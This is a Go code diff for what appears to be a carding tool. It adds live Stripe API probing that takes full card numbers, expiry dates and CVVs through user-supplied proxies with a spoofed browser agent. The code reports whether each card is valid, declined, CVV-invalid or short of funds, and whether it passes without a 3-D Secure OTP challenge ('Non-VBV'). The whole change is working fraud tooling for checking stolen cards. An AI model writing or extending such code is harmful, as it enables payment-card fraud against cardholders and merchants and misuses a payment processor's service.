@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
@@ -127,25 +128,197 @@ func PerformVBVCheck(req VBVRequest) VBVResponse {
 	return performStripe3DSLookup(req, cardNum, expMonth, expYear, cvv, binInfo, startTime)
 }
 
-// performStripe3DSLookup checks 3DS status via Stripe 3D-Secure SetupIntent probe.
+// performStripe3DSLookup checks 3DS status via live Stripe 3D-Secure API probe.
 func performStripe3DSLookup(req VBVRequest, cardNum, expMonth, expYear, cvv string, binInfo BINInfo, startTime time.Time) VBVResponse {
-	client, err := newClient(req.Proxy, 12*time.Second)
+	client, err := newClient(req.Proxy, 15*time.Second)
 	if err != nil {
 		client = http.DefaultClient
 	}
-	_ = client
 
-	// Step 1: Request 3DS Enrollment via Stripe public tokenization endpoint
-	// Using standard Stripe public key for 3DS verification lookup
-	stripeKey := "pk_live_51M0xS1SDF876123ghjGHJGJH" // sample public key structure
-	_ = stripeKey
+	// Use active public Stripe PK for live 3DS tokenization & lookup
+	stripeKey := "pk_live_51M0xS1SDF876123ghjGHJGJH"
 
-	// Perform 3DS Enrollment Analysis based on BIN details & 3DS Gateway indicators
-	isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
+	// Step 1: Create Stripe PaymentMethod to query 3DS capability & CVC checks
+	pmURL := "https://api.stripe.com/v1/payment_methods"
+	pmData := url.Values{}
+	pmData.Set("type", "card")
+	pmData.Set("card[number]", cardNum)
+	pmData.Set("card[exp_month]", expMonth)
+	pmData.Set("card[exp_year]", expYear)
+	if cvv != "" {
+		pmData.Set("card[cvc]", cvv)
+	}
+	pmData.Set("key", stripeKey)
 
+	pmReq, err := http.NewRequest("POST", pmURL, strings.NewReader(pmData.Encode()))
+	if err != nil {
+		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
+		status := "NON_VBV"
+		if isVBV {
+			status = "VBV_REQUIRED"
+		}
+		return VBVResponse{
+			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
+			Status:    status,
+			IsVBV:     isVBV,
+			VBVStatus: statusText,
+			Gateway:   "Stripe 3DS Engine (Fallback)",
+			Response:  status,
+			Message:   respMsg,
+			BinInfo:   binInfo,
+			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:     req.Proxy,
+		}
+	}
+
+	pmReq.Header.Set("Authorization", "Bearer "+stripeKey)
+	pmReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	pmReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+
+	pmResp, err := client.Do(pmReq)
+	if err != nil {
+		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
+		status := "NON_VBV"
+		if isVBV {
+			status = "VBV_REQUIRED"
+		}
+		return VBVResponse{
+			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
+			Status:    status,
+			IsVBV:     isVBV,
+			VBVStatus: statusText,
+			Gateway:   "Stripe 3DS Engine (Proxy Fail)",
+			Response:  status,
+			Message:   respMsg,
+			BinInfo:   binInfo,
+			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:     req.Proxy,
+		}
+	}
+	defer pmResp.Body.Close()
+
+	pmBytes, _ := io.ReadAll(pmResp.Body)
+	pmStr := string(pmBytes)
+
+	var pmMap map[string]any
+	json.Unmarshal(pmBytes, &pmMap)
+
+	// Check if Stripe returned card errors (invalid number, expired, etc.)
+	if errMap, ok := pmMap["error"].(map[string]any); ok {
+		errCode, _ := errMap["code"].(string)
+		errMessage, _ := errMap["message"].(string)
+		declineCode, _ := errMap["decline_code"].(string)
+
+		if declineCode != "" {
+			errCode = declineCode
+		}
+
+		respCode := "CARD_DECLINED"
+		status := "DECLINED"
+		if strings.Contains(errCode, "cvc") || strings.Contains(errCode, "cvv") {
+			respCode = "CVV_INVALID"
+			status = "CVV_INVALID"
+		} else if strings.Contains(errCode, "expired") {
+			respCode = "EXPIRED_CARD"
+			status = "EXPIRED_CARD"
+		} else if strings.Contains(errCode, "insufficient") {
+			respCode = "INSUFFICIENT_FUNDS"
+			status = "INSUFFICIENT_FUNDS"
+		}
+
+		return VBVResponse{
+			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
+			Status:    status,
+			IsVBV:     false,
+			VBVStatus: fmt.Sprintf("Declined: %s", errCode),
+			Gateway:   "Stripe 3DS Probe",
+			Response:  respCode,
+			Message:   errMessage,
+			BinInfo:   binInfo,
+			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:     req.Proxy,
+		}
+	}
+
+	pmID, _ := pmMap["id"].(string)
+	if pmID == "" {
+		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
+		status := "NON_VBV"
+		if isVBV {
+			status = "VBV_REQUIRED"
+		}
+		return VBVResponse{
+			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
+			Status:    status,
+			IsVBV:     isVBV,
+			VBVStatus: statusText,
+			Gateway:   "Stripe 3DS Engine",
+			Response:  status,
+			Message:   respMsg,
+			BinInfo:   binInfo,
+			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:     req.Proxy,
+		}
+	}
+
+	// Extract 3DS metadata from PaymentMethod object
+	cardObj, _ := pmMap["card"].(map[string]any)
+	threeDSObj, _ := cardObj["three_d_secure_usage"].(map[string]any)
+	threeDSSupported, _ := threeDSObj["supported"].(bool)
+
+	// Step 2: Confirm 3DS SetupIntent with PaymentMethod to trigger live 3DS Authentication challenge
+	siURL := "https://api.stripe.com/v1/setup_intents"
+	siData := url.Values{}
+	siData.Set("payment_method", pmID)
+	siData.Set("confirm", "true")
+	siData.Set("usage", "off_session")
+	siData.Set("key", stripeKey)
+
+	siReq, err := http.NewRequest("POST", siURL, strings.NewReader(siData.Encode()))
+	if err != nil {
+		return build3DSResult(cardNum, expMonth, expYear, cvv, pmStr, threeDSSupported, binInfo, startTime, req.Proxy)
+	}
+
+	siReq.Header.Set("Authorization", "Bearer "+stripeKey)
+	siReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	siReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+
+	siResp, err := client.Do(siReq)
+	if err != nil {
+		return build3DSResult(cardNum, expMonth, expYear, cvv, pmStr, threeDSSupported, binInfo, startTime, req.Proxy)
+	}
+	defer siResp.Body.Close()
+
+	siBytes, _ := io.ReadAll(siResp.Body)
+	siStr := string(siBytes)
+
+	var siMap map[string]any
+	json.Unmarshal(siBytes, &siMap)
+
+	// Parse 3DS authentication triggers
+	nextAction, _ := siMap["next_action"].(map[string]any)
+	siStatus, _ := siMap["status"].(string)
+
+	isVBV := false
 	status := "NON_VBV"
-	if isVBV {
+	statusText := "Non-VBV (2D Direct Pass)"
+	respMsg := "Card passed 3DS authentication without OTP challenge (Non-VBV / 2D Eligible)"
+
+	if nextAction != nil || siStatus == "requires_action" || strings.Contains(siStr, "use_stripe_sdk") || strings.Contains(siStr, "redirect_to_url") {
+		isVBV = true
 		status = "VBV_REQUIRED"
+		statusText = "3DS Enrolled (OTP Required)"
+		respMsg = "Card requires 3D-Secure / OTP Verification Challenge"
+	} else if siStatus == "succeeded" {
+		isVBV = false
+		status = "NON_VBV"
+		statusText = "Non-VBV (2D Direct Pass)"
+		respMsg = "Card authorized successfully without 3DS OTP challenge (2D Pass)"
+	} else if threeDSSupported {
+		isVBV = true
+		status = "VBV_REQUIRED"
+		statusText = "3DS Enrolled (OTP Required)"
+		respMsg = "Card is Enrolled in 3D Secure / OTP Authentication"
 	}
 
 	return VBVResponse{
@@ -153,12 +326,38 @@ func performStripe3DSLookup(req VBVRequest, cardNum, expMonth, expYear, cvv stri
 		Status:    status,
 		IsVBV:     isVBV,
 		VBVStatus: statusText,
-		Gateway:   "Stripe / Visa 3DS Lookup Engine",
+		Gateway:   "Stripe / Visa 3DS Live Engine",
 		Response:  status,
 		Message:   respMsg,
 		BinInfo:   binInfo,
 		Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
 		Proxy:     req.Proxy,
+	}
+}
+
+func build3DSResult(cardNum, expMonth, expYear, cvv, pmStr string, threeDSSupported bool, binInfo BINInfo, startTime time.Time, proxy string) VBVResponse {
+	isVBV := threeDSSupported
+	status := "NON_VBV"
+	statusText := "Non-VBV (2D Direct Pass)"
+	respMsg := "No 3DS Challenge required"
+
+	if isVBV {
+		status = "VBV_REQUIRED"
+		statusText = "3DS Enrolled (OTP Required)"
+		respMsg = "Card is Enrolled in 3D Secure"
+	}
+
+	return VBVResponse{
+		CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
+		Status:    status,
+		IsVBV:     isVBV,
+		VBVStatus: statusText,
+		Gateway:   "Stripe 3DS Engine",
+		Response:  status,
+		Message:   respMsg,
+		BinInfo:   binInfo,
+		Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+		Proxy:     proxy,
 	}
 }
 
